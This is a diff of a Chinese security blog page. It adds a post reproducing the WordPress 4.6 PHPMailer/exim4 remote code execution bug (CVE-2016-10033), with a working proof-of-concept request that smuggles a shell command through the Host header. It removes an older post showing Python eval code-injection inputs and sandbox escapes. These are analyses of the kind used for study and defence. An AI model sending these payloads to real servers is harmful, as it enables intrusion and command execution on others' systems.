@@ -331,6 +331,191 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/" itemprop="url">
+                  WordPress远程代码执行环境构造和VirtualHost环境验证
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-05T09:41:26+08:00">
+                2017-05-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/" class="leancloud_visitors" data-flag-title="WordPress远程代码执行环境构造和VirtualHost环境验证">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>当地时间5月3日（北京时间5月4日凌晨），WordPress被曝出存在严重的安全隐患。一则关于漏洞CVE-2016-10033的新POC被爆出。这是一个PHPMailer的漏洞，WordPress 4.6使用了存在该漏洞的PHPMailer，出于安全考虑，WordPress官方在4.7.1中更新了PHPMailer，解决了这个问题。但PHPMailer漏洞的原作者，又发现了一个针对PHPMailer在使用exim4 MTA时的利用方法。新POC的曝出也表示着WordPress 4.6版本均受影响。<br><a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" target="_blank" rel="external">rce 原始出处</a><br>    这里面的核心点就是作者提供了可用的针对WordPress的利用方法，利用的攻击向量就是exim4 MTA.</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>本文作者直接用的Ubuntu 14.04，WordPress 4.6，其他都是通过apt-get安装搭建的环境。我看有童鞋通过docker这种方式来搭建环境，遇到的坑实在太多，可以参考下这个。简单示例下：<br>由于是利用的exim4 MTA的攻击向量，这在Ubuntu14.04是默认不存在的。</p>
+<h2 id="安装exim4"><a href="#安装exim4" class="headerlink" title="安装exim4"></a>安装exim4</h2><p>通过<code>apt-get install exim4</code>直接安装,安装完的效果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">liaoxinxi@ubuntu:/var/www/WordPress-4.6$ ls -al /usr/sbin/sendmail</div><div class="line">lrwxrwxrwx 1 root root 5 Jan  5 23:10 /usr/sbin/sendmail -&gt; exim4</div><div class="line">liaoxinxi@ubuntu:/var/www/WordPress-4.6$ sudo netstat -anp|grep <span class="string">":25"</span></div><div class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1683/exim4</div><div class="line">tcp6       0      0 ::1:25                  :::*                    LISTEN      1683/exim4</div></pre></td></tr></table></figure>
+<p>apt-get安装完会在系统建立sendmail的软连接，这个软连接直接指向了exim4，当然也就不需要再安装sendmail了。安装完之后会在系统的25号端口建立监听。</p>
+<h2 id="安装Mysql，设置数据库"><a href="#安装Mysql，设置数据库" class="headerlink" title="安装Mysql，设置数据库"></a>安装Mysql，设置数据库</h2><p>接下来就是wordpress的安装，这个网上的文章很多，看权威文档即可，下面是记录文档。<br>数据库的安装，本来系统有个mysql数据库，但是忘记root密码，试了好多遍，好吧，只能卸载了重装，这个卸载的一定得把数据清除了，不然root密码还是原来的。附安装脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 sudo apt-get install mysql-server</div><div class="line">2 sudo apt-get install mysql-client</div><div class="line">3 sudo apt-get install  php5-mysqlnd-ms</div></pre></td></tr></table></figure>
+<p>在装数据库的时候会弹出让你填入root用户名和密码，直接写入就可以，记得后续得用到<br>创建数据库表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CREATE DATABASE wp_myblog;</div><div class="line">mysql&gt; GRANT ALL PRIVILEGES ON wp_myblog.* TO <span class="string">'wordpress'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'wordpress'</span>;</div><div class="line">mysql&gt; FLUSH PRIVILEGES;</div><div class="line">mysql&gt; EXIT;</div></pre></td></tr></table></figure>
+<h2 id="配置Apache"><a href="#配置Apache" class="headerlink" title="配置Apache"></a>配置Apache</h2><p>解压WordPress的zip包到web目录，设置apache2配置文件。WordPress 4.6的下载地址：<a href="https://github.com/WordPress/WordPress/archive/4.6.zip，" target="_blank" rel="external">https://github.com/WordPress/WordPress/archive/4.6.zip，</a><br>apach2的简单配置如下,就是设置DocumentRoot指向刚才解压后WordPress的路径：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">vi /etc/apache2/sites-enabled/000-default.conf</div><div class="line"></div><div class="line"> 35 &lt;VirtualHost *:80&gt;</div><div class="line"> 36     <span class="comment"># The ServerName directive sets the request scheme, hostname and port that</span></div><div class="line"> 37     <span class="comment"># the server uses to identify itself. This is used when creating</span></div><div class="line"> 38     <span class="comment"># redirection URLs. In the context of virtual hosts, the ServerName</span></div><div class="line"> 39     <span class="comment"># specifies what hostname must appear in the request's Host: header to</span></div><div class="line"> 40     <span class="comment"># match this virtual host. For the default virtual host (this file) this</span></div><div class="line"> 41     <span class="comment"># value is not decisive as it is used as a last resort host regardless.</span></div><div class="line"> 42     <span class="comment"># However, you must set it for any further virtual host explicitly.</span></div><div class="line"> 43     <span class="comment">#ServerName www.example.com</span></div><div class="line"> 44     ServerName www.a.com</div><div class="line"> 46     DocumentRoot /var/www/WordPress-4.6/</div></pre></td></tr></table></figure>
+<h2 id="配置WordPress-wp-config"><a href="#配置WordPress-wp-config" class="headerlink" title="配置WordPress wp-config"></a>配置WordPress wp-config</h2><p>编辑wp-config.php，首先<code>sudo cp wp-config-sample.php wp-config.php</code>,修改如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">23 define(&apos;DB_NAME&apos;, &apos;wp_myblog&apos;);</div><div class="line">24</div><div class="line">25 /** MySQL database username */</div><div class="line">26 define(&apos;DB_USER&apos;, &apos;wordpress&apos;);</div><div class="line">27</div><div class="line">28 /** MySQL database password */</div><div class="line">29 define(&apos;DB_PASSWORD&apos;, &apos;wordpress&apos;);</div></pre></td></tr></table></figure>
+<h2 id="重启进程"><a href="#重启进程" class="headerlink" title="重启进程"></a>重启进程</h2><p>最后重启数据库，apache2</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/apache2 restart</div><div class="line">sudo/etc/init.d/mysql start</div></pre></td></tr></table></figure>
+<p>重启完之后访问我们的设置的IP或者域名，按照提示一步步设置即可。不过得记住具体设置的用户名或者email地址，这个在后续的poc中会用到。</p>
+<h1 id="VirtualHost-环境验证"><a href="#VirtualHost-环境验证" class="headerlink" title="VirtualHost 环境验证"></a>VirtualHost 环境验证</h1><p>在实际的应用中，很多时候都会用到VirtualHost来配置主机和域名的对应关系，在原作者的payload也提到了是利用了默认的Apache2配置，那么不是默认的Apache2配置呢？设置了ServerName的这种情况呢？经测试发现，不修改Poc的话，直接访问该IP，Apache会将请求交给第一个VirtualHost处理。<br>那如果修改Poc呢，笔者尝试修改完之后能达到访问任意VirtualHost环境，这就避免了原作者必须利用默认配置的情况，这样的话这个漏洞的威力又大了一成。下面附上设置的VirtualHost环境，大家可以尝试修改试试，这个针对带多个VirtualHost的poc暂时先不公布，大家可以先仔细测测,肯定是可以的，笔者的环境中WordPress即不在第一个VirtualHost上，也是能被攻击的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;VirtualHost *:80&gt;</div><div class="line">    ServerAdmin webmaster@localhost</div><div class="line">    ServerName www.b.com</div><div class="line">    DocumentRoot /var/www/DVWA-1.9</div><div class="line">    ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</div><div class="line">    CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</div><div class="line"></div><div class="line">&lt;/VirtualHost&gt;</div><div class="line">&lt;VirtualHost *:80&gt;</div><div class="line">    ServerName www.a.com</div><div class="line">    DocumentRoot /var/www/WordPress-4.6/</div><div class="line">    ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error1.log</div><div class="line">    CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access1.log combined</div><div class="line">&lt;/VirtualHost&gt;</div></pre></td></tr></table></figure>
+<h1 id="poc-简单解读"><a href="#poc-简单解读" class="headerlink" title="poc 简单解读"></a>poc 简单解读</h1><p>这个解读会比较简单，大家可以参考原作者公布的<a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" target="_blank" rel="external">blog</a>,真是不得不服人家，写的有理有据，包括怎么发现的，参考的文档，怎么绕过的，一步步的绕过历程都写得清清楚，值得细读。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">POST /wp-login.php?action=lostpassword HTTP/1.1</div><div class="line">Host: xenial(tmp1 -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;test&#125;&#125;  tmp2)</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 64</div><div class="line"></div><div class="line">user_login=wordpress&amp;redirect_to=&amp;wp-submit=Get+New+Password</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Found</div><div class="line">Date: Thu, 04 May 2017 07:37:15 GMT</div><div class="line">Server: Apache/2.4.7 (Ubuntu)</div><div class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.21</div><div class="line">Expires: Wed, 11 Jan 1984 05:00:00 GMT</div><div class="line">Cache-Control: no-cache, must-revalidate, max-age=0</div><div class="line">Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/</div><div class="line">X-Frame-Options: SAMEORIGIN</div><div class="line">Location: wp-login.php?checkemail=confirm</div><div class="line">Content-Length: 0</div><div class="line">Connection: close</div><div class="line">Content-Type: text/html; charset=UTF-8</div></pre></td></tr></table></figure>
+<p>原作者主要是利用了Host中可以包含注释来夹带私货，来绕过域名中不能包含空格的问题（注释中域名部分可带空格来分割sendmail的参数），在WordPress中filter_var/FILTER_VALIDATE_EMAIL中和PHPMailer library库中validateAddress(）都是参考的<a href="https://www.ietf.org/rfc/rfc822.txt" target="_blank" rel="external">RFC 822</a>，实现都是一样的。一个简单的注释示例如<code>john@example.com(comment)</code>,而且域名部分可以包含空格。这就可以将参数传递到sendmail的第五个，第六个参数。为了绕过不能/的问题，作者尝试了perl，base64/hex，最终选定了substr来提取exim4自带的默认参数，<code>${substr{0}{1}{$spool_directory}</code> 来替代 用 <code>/</code>,${substr{10}{1}{$tod_log}} 来替代空格，这样就可以搞定一个命令执行。其实exim中涉及的变量还挺多，还有些是可以利用的。<code>/usr/bin/touch /tmp/test</code>,对于上面提供的poc得注意user_login必须是存在的，这个也在文章中设置wordpress的时候提到过，可以是用户名或者邮箱,提供的不对的话会报用户不存在的错误。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2025,264 +2210,6 @@ public List&lt;IScannerInsertionPoint&gt; getInsertionPoints(IHttpRequestRespons
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2015/07/31/Python eval的常见错误封装及利用原理/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/07/31/Python eval的常见错误封装及利用原理/" itemprop="url">
-                  Python eval的常见错误封装及利用原理
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-07-31T15:39:38+08:00">
-                2015-07-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index">
-                    <span itemprop="name">Python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2015/07/31/Python eval的常见错误封装及利用原理/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2015/07/31/Python eval的常见错误封装及利用原理/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2015/07/31/Python eval的常见错误封装及利用原理/" class="leancloud_visitors" data-flag-title="Python eval的常见错误封装及利用原理">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>最近在代码评审的过程，发现挺多错误使用eval导致代码注入的问题，比较典型的就是把eval当解析dict使用，有的就是简单的使用eval，有的就是错误的封装了eval，供全产品使用，这引出的问题更严重，这些都是血淋淋的教训，大家使用的时候多加注意。<br>下面列举一个实际产品中的例子，详情见[bug83055][1]：</p>
-<pre><code>def remove(request, obj)：
-     query = query2dict(request.POST)
-     eval(query[&apos;oper_type&apos;])(query, customer_obj)
-</code></pre><p>而query就是POST直接转换而来，是用户可直接控制的，假如用户在url参数中输入<code>oper_type=__import__(&#39;os&#39;).system(&#39;sleep 5&#39;)</code> 则可以执行命令sleep，当然也可以执行任意系统命令或者任意可执行代码，危害是显而易见的，那我们来看看eval到底是做什么的，以及如何做才安全？</p>
-<h1 id="1，做什么"><a href="#1，做什么" class="headerlink" title="1，做什么"></a>1，做什么</h1><p>简单来说就是执行一段表达式</p>
-<pre><code>&gt;&gt;&gt; eval(&apos;2+2&apos;)
-4
-
-&gt;&gt;&gt; eval(&quot;&quot;&quot;{&apos;name&apos;:&apos;xiaoming&apos;,&apos;ip&apos;:&apos;10.10.10.10&apos;}&quot;&quot;&quot;)
-{&apos;ip&apos;: &apos;10.10.10.10&apos;, &apos;name&apos;: &apos;xiaoming&apos;}
-
-&gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;uname&apos;)&quot;, {})
-Linux
-0
-</code></pre><p>从这三段代码来看，第一个很明显做计算用，第二个把string类型数据转换成python的数据类型，这里是dict，这也是咱们产品中常犯的错误。第三个就是坏小子会这么干，执行系统命令。<br>eval 可接受三个参数，eval(source[, globals[, locals]]) -&gt; value<br>globals必须是路径，locals则必须是键值对，默认取系统globals和locals</p>
-<h1 id="2，不正确的封装"><a href="#2，不正确的封装" class="headerlink" title="2，不正确的封装"></a>2，不正确的封装</h1><p>（1）下面我们来看一段咱们某个产品代码中的封装函数，见[bug][2]，或者<a href="http://blog.knownsec.com/2012/05/python%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%A8%81%E8%83%81%E4%B9%8Beval%EF%BC%88%EF%BC%89/" target="_blank" rel="external">网络上搜索排名比较高的代码</a>，eg：</p>
-<pre><code>def safe_eval(eval_str):
-    try:
-        #加入命名空间
-        safe_dict = {}
-        safe_dict[&apos;True&apos;] = True
-        safe_dict[&apos;False&apos;] = False
-        return eval(eval_str,{&apos;__builtins__&apos;:None},safe_dict)
-    except Exception,e:
-        traceback.print_exc()
-        return &apos;&apos;
-</code></pre><p>在这里<code>__builtins__</code>置为空了，所以像<code>__import__</code>这是内置变量就没有了，这个封装函数就安全了吗？下面我一步步道来：</p>
-<pre><code>&gt;&gt;&gt; dir(__builtins__)
-[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;,
-</code></pre><p>列表项</p>
-<p> ‘UnicodeEncodeError’, ‘UnicodeError’, ‘UnicodeTranslateError’, ‘UnicodeWarning’, ‘UserWarning’, ‘ValueError’, ‘Warning’, ‘ZeroDivisionError’, ‘_’, ‘<strong>debug</strong>‘, ‘<strong>doc</strong>‘, ‘<strong>import</strong>‘, ‘<strong>name</strong>‘, ‘<strong>package</strong>‘, ‘abs’, ‘all’, ‘any’, ‘apply’, ‘basestring’, ‘bin’, ‘bool’, ‘buffer’, ‘bytearray’, ‘bytes’, ‘callable’, ‘chr’, ‘classmethod’, ‘cmp’, ‘coerce’, ‘compile’, ‘complex’, ‘copyright’, ‘credits’, ‘delattr’, ‘dict’, ‘dir’, ‘divmod’, ‘enumerate’, ‘eval’, ‘execfile’, ‘exit’, ‘file’, ‘filter’, ‘float’, ‘format’, ‘frozenset’, ‘getattr’, ‘globals’, ‘hasattr’, ‘hash’, ‘help’, ‘hex’, ‘id’, ‘input’, ‘int’, ‘intern’, ‘isinstance’, ‘issubclass’, ‘iter’, ‘len’, ‘license’, ‘list’, ‘locals’, ‘long’, ‘map’, ‘max’, ‘memoryview’, ‘min’, ‘next’, ‘object’, ‘oct’, ‘open’, ‘ord’, ‘pow’, ‘print’, ‘property’, ‘quit’, ‘range’, ‘raw_input’, ‘reduce’, ‘reload’, ‘repr’, ‘reversed’, ‘round’, ‘set’, ‘setattr’, ‘slice’, ‘sorted’, ‘staticmethod’, ‘str’, ‘sum’, ‘super’, ‘tuple’, ‘type’, ‘unichr’, ‘unicode’, ‘vars’, ‘xrange’, ‘zip’]</p>
-<p>从<code>__builtins__</code>可以看到其模块中有<code>__import__</code>,可以借助用来执行os的一些操作。如果置为空，再去执行eval函数呢，结果如下：</p>
-<pre><code>&gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;uname&apos;)&quot;, {&apos;__builtins__&apos;:{}})
-Traceback (most recent call last):
-  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
-  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
-NameError: name &apos;__import__&apos; is not defined
-</code></pre><p>现在就是提示<code>__import__</code>未定义，不能成功执行了，看情况是安全了吧？答案当然是错的。<br>比如执行如下：</p>
-<pre><code>&gt;&gt;&gt; s = &quot;&quot;&quot;
-... (lambda fc=(
-...     lambda n: [
-...         c for c in
-...             ().__class__.__bases__[0].__subclasses__()
-...             if c.__name__ == n
-...         ][0]
-...     ):
-...     fc(&quot;function&quot;)(
-...         fc(&quot;code&quot;)(
-...             0,0,0,0,&quot;test&quot;,(),(),(),&quot;&quot;,&quot;&quot;,0,&quot;&quot;
-...         ),{}
-...     )()
-... )()
-... &quot;&quot;&quot;
-&gt;&gt;&gt; eval(s, {&apos;__builtins__&apos;:{}})
-Segmentation fault (core dumped)
-</code></pre><p>在这里用户定义了一段函数，这个函数调用，直接导致段错误<br>下面这段代码则是退出解释器：</p>
-<pre><code>&gt;&gt;&gt;
-&gt;&gt;&gt; s = &quot;&quot;&quot;
-... [
-...     c for c in
-...     ().__class__.__bases__[0].__subclasses__()
-...     if c.__name__ == &quot;Quitter&quot;
-... ][0](0)()
-... &quot;&quot;&quot;
-&gt;&gt;&gt; eval(s,{&apos;__builtins__&apos;:{}})
-liaoxinxi@RCM-RSAS-V6-Dev ~/tools/auto_judge $ 
-</code></pre><p>初步理解一下整个过程：</p>
-<pre><code>&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()
-[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;Struct&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;class &apos;configobj.InterpolationEngine&apos;&gt;, &lt;class &apos;configobj.SimpleVal&apos;&gt;, &lt;class &apos;configobj.InterpolationEngine&apos;&gt;, &lt;class &apos;configobj.SimpleVal&apos;&gt;]
-</code></pre><p>这句python代码的意思就是找tuple的class，再找它的基类，也就是object，再通过object找他的子类，具体的子类也如代码中的输出一样。从中可以看到了有file模块，zipimporter模块，是不是可以利用下呢？首先从file入手<br>假如用户如果构造：</p>
-<pre><code>&gt;&gt;&gt; s1 = &quot;&quot;&quot;
-... [
-...     c for c in
-...     ().__class__.__bases__[0].__subclasses__()
